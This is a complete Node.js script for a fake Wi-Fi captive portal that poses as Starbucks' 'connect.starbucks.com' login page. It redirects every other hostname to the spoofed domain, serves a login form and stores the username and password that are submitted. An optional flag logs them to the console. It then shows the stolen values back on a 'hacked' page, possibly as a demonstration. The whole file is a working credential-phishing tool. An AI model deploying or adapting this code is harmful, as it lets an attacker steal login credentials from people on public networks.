// Configuration

const selfAddress = '10.0.0.1';
const selfPort = 80;
const logRequests = true;
const logCredentials = false;
const domainName = 'connect.starbucks.com';

// Dependencies

const http = require('http');
const fs = require('fs');
const uuid = require('uuid');

// Functions

function handleGet(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
    'Loading...');
    return;
  }
  let cookies = parseCookies(req.headers.cookie);
  let resource = req.url;
  switch (resource) {
    case '/':
      resource = '/login.html';
      break;
    case '/favicon.ico':
      resource = '/img/favicon.ico';
      break;
    case '/gg':
      resource = '/hacked.html';
      break;
  }
  readResource(resource, () => {
    writeResponse(res, 404, {}, 'Not Found');
  }, contentBuffer => {
    if (resource == '/hacked.html') {
      if (cookies.id) {
        if (credentials[cookies.id] && credentials[cookies.id].username
        && credentials[cookies.id].password) {
          let contentString = contentBuffer.toString();
          contentString = contentString.replace('[PLACEHOLDER_USERNAME]',
          credentials[cookies.id].username);
          contentString = contentString.replace('[PLACEHOLDER_PASSWORD]',
          credentials[cookies.id].password);
          contentBuffer = Buffer.from(contentString, 'utf8');
        }
        delete credentials[cookies.id];
      }
    }
    writeResponse(res, 200, {}, contentBuffer);
  });
}

function handlePost(req, res) {
  if (req.headers.host != domainName) {
    writeResponse(res, 302, { 'Location': 'http://' + domainName + '/' },
    'Loading...');
    return;
  }
  let resource = req.url;
  switch (resource) {
    case '/login':
      parseFormData(req, formData => {
        let id = uuid.v4();
        credentials[id] = {};
        credentials[id] = formData;
        if (logCredentials) {
          console.log(credentials[id]);
        }
        writeResponse(res, 302, { 'Location': '/gg', 'Set-Cookie': 'id=' + id },
        'Loading...');
      });
      break;
    default:
      writeResponse(res, 400, {}, 'Bad Request');
      break;
  }
}

function handleUnsupported(res) {
  writeResponse(res, 400, {}, 'Bad Request');
}

function writeResponse(res, statusCode, headers, content) {
  for (let [key, value] of Object.entries(headers)) {
    res.setHeader(key, value);
  }
  res.writeHead(statusCode);
  res.end(content);
}

function readResource(resource, errorCallback, successCallback) {
  fs.readFile(__dirname + '/resources' + resource, (error, contentBuffer) => {
    if (error) {
      errorCallback();
      return;
    }
    successCallback(contentBuffer);
  });
}

function parseFormData(req, callback) {
  let body = '';
  req.on('data', chunk => {
    body += chunk;
  }).on('end', () => {
    let searchParams = new URLSearchParams(body);
    let formData = {};
    searchParams.forEach((value, key) => {
      formData[key] = value;
    });
    callback(formData);
  });
}

function parseCookies(cookieHeader) {
  let cookies = {};
  if (!cookieHeader) {
    return cookies;
  }
  cookieHeader.split(';').forEach(cookie => {
    let [key, value] = cookie.split('=');
    cookies[key] = value;
  });
  return cookies;
}

// Main script

let credentials = {};

http.createServer((req, res) => {
  if (logRequests) {
    console.log(req.method + ': ' + req.headers.host + req.url);
  }
  switch (req.method) {
    case 'GET':
      handleGet(req, res);
      break;
    case 'POST':
      handlePost(req, res);
      break;
    default:
      handleUnsupported(res);
      break;
  }
}).listen(selfPort, selfAddress);

console.log('HTTP server listening on ' + selfAddress + ':' + selfPort);